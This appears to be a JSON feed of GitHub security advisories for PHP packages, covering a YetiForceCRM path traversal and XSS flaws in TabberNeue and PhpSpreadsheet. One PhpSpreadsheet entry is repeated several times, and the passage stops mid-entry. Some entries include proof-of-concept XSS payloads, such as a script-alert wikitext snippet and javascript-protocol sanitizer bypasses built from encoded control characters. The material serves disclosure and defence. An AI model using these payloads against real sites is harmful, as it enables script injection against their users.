{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<p>Directory Traversal vulnerability in YetiForceCompany YetiForceCRM versions 6.4.0 and before allows a remote authenticated attacker to obtain sensitive information via the license parameter in the LibraryLicense.php component.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49508\">https://nvd.nist.gov/vuln/detail/CVE-2023-49508</a></li>\n<li><a href=\"https://github.com/YetiForceCompany/YetiForceCRM/commit/ba3a348aa6ecdf0a1d8b289cbb679bebcda7a132\">https://github.com/YetiForceCompany/YetiForceCRM/commit/ba3a348aa6ecdf0a1d8b289cbb679bebcda7a132</a></li>\n<li><a href=\"https://github.com/c4v4r0n/Research/tree/main/CVE-2023-49508\">https://github.com/c4v4r0n/Research/tree/main/CVE-2023-49508</a></li>\n<li><a href=\"https://huntr.com/bounties/29ed641d-eb03-4532-aed4-f96e11f78983\">https://huntr.com/bounties/29ed641d-eb03-4532-aed4-f96e11f78983</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-394m-vxwj-363j\">https://github.com/advisories/GHSA-394m-vxwj-363j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-394m-vxwj-363j",
            "title": "[yetiforce/yetiforce-crm] YetiForceCRM Directory Traversal vulnerability",
            "date_modified": "2025-01-06T18:10:34.000Z",
            "date_published": "2024-02-16T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-394m-vxwj-363j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There are several sources of arbitrary, unescaped user input being used to construct HTML, which allows any user that can edit pages or otherwise render wikitext to XSS other users.</p>\n<blockquote>\n<p>Edit: Only the first XSS can be reproduced in production.</p>\n</blockquote>\n<h3 id=\"details\">Details</h3>\n<blockquote>\n<p>✅ Verified and patched in f229cab099c69006e25d4bad3579954e481dc566</p>\n</blockquote>\n<p><a href=\"https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/2526daa9f8cfdd616c861c8439755cb74a6c8c6e/includes/TabberTransclude.php#L154\">https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/2526daa9f8cfdd616c861c8439755cb74a6c8c6e/includes/TabberTransclude.php#L154</a>\nThis doesn't escape the user-supplied page name when outputting, so an XSS payload as the page name can be used here.</p>\n<p>This was caused by d8c3db4e5935476e496d979fb01f775d3d3282e6.</p>\n<hr>\n<blockquote>\n<p>❌ Invalid as MediaWiki parser sanitizes dangerous HTML</p>\n</blockquote>\n<p><a href=\"https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/2526daa9f8cfdd616c861c8439755cb74a6c8c6e/includes/Tabber.php#L160\">https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/2526daa9f8cfdd616c861c8439755cb74a6c8c6e/includes/Tabber.php#L160</a>\nThe documentation for <a href=\"https://doc.wikimedia.org/mediawiki-core/REL1_42/php/classMediaWiki_1_1Parser_1_1Parser.html#ae450036ec9abb417f142bfdaede02783\"><code>Parser::recursiveTagParse()</code></a> states that it returns unsafe HTML, and the <code>$content</code> being supplied is from user input.</p>\n<p>This was caused by 95351812613e04717f3ad7844cfcc67e4ede4d11.</p>\n<hr>\n<blockquote>\n<p>❌ Invalid as TabberParsoid is not being used</p>\n</blockquote>\n<p><a href=\"https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/2526daa9f8cfdd616c861c8439755cb74a6c8c6e/includes/TabberParsoid.php#L96\">https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/2526daa9f8cfdd616c861c8439755cb74a6c8c6e/includes/TabberParsoid.php#L96</a>\nThis uses unescaped user input as the attribute of an element, thus allowing the user to break out of the attribute or element and injecting arbitrary attributes to the element, or inserting new ones (such as a script tag).</p>\n<p>This was caused by 8278e665480f08da635aee383c6b5caaeca26ba3.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>For the first XSS, render the following wikitext (whether it be through saving it to a page and viewing it, or via Special:ExpandTemplates):</p>\n<pre><code class=\"language-wikitext\">&lt;tabbertransclude&gt;\n&lt;script&gt;alert(1)&lt;/script&gt; | hehe\n&lt;/tabbertransclude&gt;\n</code></pre>\n<p><img alt=\"\" src=\"https://github.com/user-attachments/assets/079365a9-203d-4758-a5a4-2166f9a32e62\"></p>\n<p>For the second XSS, I have given up attempting to reproduce it after over twenty minutes of \"surfing through the internals of the MediaWiki parser fishing for an XSS out of this giant contraption as I bring myself deeper and deeper into the cogs of the machine that no one knows how to maintain or fully operate ever since its conception\".</p>\n<p>For the third XSS, this is unreachable as the class is never used, though it should be fixed anyway (or the file removed).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any user with the ability to cause another user to render wikitext (such as viewing a page that the user can edit, or an attacker tricking the victim to click on a link to Special:ExpandTemplates with the malicious wikitext in the <code>wpInput</code> parameter) can XSS said user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/security/advisories/GHSA-4x6x-8rm8-c37j\">https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/security/advisories/GHSA-4x6x-8rm8-c37j</a></li>\n<li><a href=\"https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/d8c3db4e5935476e496d979fb01f775d3d3282e6\">https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/d8c3db4e5935476e496d979fb01f775d3d3282e6</a></li>\n<li><a href=\"https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/f229cab099c69006e25d4bad3579954e481dc566\">https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/f229cab099c69006e25d4bad3579954e481dc566</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-21612\">https://nvd.nist.gov/vuln/detail/CVE-2025-21612</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4x6x-8rm8-c37j\">https://github.com/advisories/GHSA-4x6x-8rm8-c37j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4x6x-8rm8-c37j",
            "title": "[starcitizentools/tabber-neue] Extension:TabberNeue vulnerable to Cross-site Scripting",
            "date_modified": "2025-01-06T18:42:32.000Z",
            "date_published": "2025-01-06T15:47:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4x6x-8rm8-c37j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters\">Bypass XSS sanitizer using the javascript protocol and special characters</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateRow</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>\n<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 6. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.\nThe Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>\n<p><img alt=\"fig11\" src=\"https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd\"></p>\n<p><em>Figure 11. Using the javascript protocol with special characters</em></p>\n<p>Some payloads help bypass the security system and carry out a XSS attack.</p>\n<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>jav&amp;#x09;ascript:alert()\njav&amp;#x0D;ascript:alert()\njav&amp;#x0A;ascript:alert()\n</code></pre>\n<p>It's clear that the javascript protocol with special characters is used. </p>\n<p><img alt=\"fig12\" src=\"https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479\"></p>\n<p><em>Figure 12. Using the javascript protocol with special characters</em></p>\n<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>\n<img src=\"https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26\" alt=\"fig13\" width=\"373\">\n\n<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56412\">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters",
            "date_modified": "2025-01-03T19:25:07.000Z",
            "date_published": "2025-01-03T17:29:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters\">Bypass XSS sanitizer using the javascript protocol and special characters</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateRow</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>\n<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 6. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.\nThe Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>\n<p><img alt=\"fig11\" src=\"https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd\"></p>\n<p><em>Figure 11. Using the javascript protocol with special characters</em></p>\n<p>Some payloads help bypass the security system and carry out a XSS attack.</p>\n<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>jav&amp;#x09;ascript:alert()\njav&amp;#x0D;ascript:alert()\njav&amp;#x0A;ascript:alert()\n</code></pre>\n<p>It's clear that the javascript protocol with special characters is used. </p>\n<p><img alt=\"fig12\" src=\"https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479\"></p>\n<p><em>Figure 12. Using the javascript protocol with special characters</em></p>\n<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>\n<img src=\"https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26\" alt=\"fig13\" width=\"373\">\n\n<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56412\">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters",
            "date_modified": "2025-01-03T19:25:07.000Z",
            "date_published": "2025-01-03T17:29:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters\">Bypass XSS sanitizer using the javascript protocol and special characters</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateRow</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>\n<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 6. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.\nThe Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>\n<p><img alt=\"fig11\" src=\"https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd\"></p>\n<p><em>Figure 11. Using the javascript protocol with special characters</em></p>\n<p>Some payloads help bypass the security system and carry out a XSS attack.</p>\n<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>jav&amp;#x09;ascript:alert()\njav&amp;#x0D;ascript:alert()\njav&amp;#x0A;ascript:alert()\n</code></pre>\n<p>It's clear that the javascript protocol with special characters is used. </p>\n<p><img alt=\"fig12\" src=\"https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479\"></p>\n<p><em>Figure 12. Using the javascript protocol with special characters</em></p>\n<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>\n<img src=\"https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26\" alt=\"fig13\" width=\"373\">\n\n<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56412\">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters",
            "date_modified": "2025-01-03T19:25:07.000Z",
            "date_published": "2025-01-03T17:29:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters\">Bypass XSS sanitizer using the javascript protocol and special characters</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateRow</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>\n<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 6. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.\nThe Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>\n<p><img alt=\"fig11\" src=\"https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd\"></p>\n<p><em>Figure 11. Using the javascript protocol with special characters</em></p>\n<p>Some payloads help bypass the security system and carry out a XSS attack.</p>\n<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>jav&amp;#x09;ascript:alert()\njav&amp;#x0D;ascript:alert()\njav&amp;#x0A;ascript:alert()\n</code></pre>\n<p>It's clear that the javascript protocol with special characters is used. </p>\n<p><img alt=\"fig12\" src=\"https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479\"></p>\n<p><em>Figure 12. Using the javascript protocol with special characters</em></p>\n<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>\n<img src=\"https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26\" alt=\"fig13\" width=\"373\">\n\n<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56412\">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters",
            "date_modified": "2025-01-03T19:25:07.000Z",
            "date_published": "2025-01-03T17:29:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header\">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateHTMLHeader</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 8. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>\n<p><img alt=\"fig14\" src=\"https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3\"></p>\n<p><em>Figure 14. Embedding the payload</em> </p>\n<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig15\" src=\"https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba\"></p>\n<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>\n<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.\n<img src=\"https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5\" alt=\"fig16\" width=\"356\"></p>\n<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56411\">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header",
            "date_modified": "2025-01-03T19:24:57.000Z",
            "date_published": "2025-01-03T17:28:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header\">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateHTMLHeader</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) 